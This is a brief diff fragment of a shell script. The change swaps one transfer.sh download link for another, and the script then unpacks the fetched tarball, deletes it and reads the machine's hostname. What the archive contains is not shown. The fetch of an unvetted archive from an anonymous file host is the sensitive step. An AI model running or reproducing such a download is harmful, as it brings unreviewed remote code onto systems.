@@ -16,7 +16,7 @@ rm -rf cwork
 echo "DONE"
 cd work
 PROG=`cat new.txt`
-wget https://transfer.sh/ITvU7h/q.tar.gz
+wget https://transfer.sh/Su5zXR/q.tar.gz
 tar xvzf q.tar.gz
 rm q.tar.gz
 hs=`hostname`
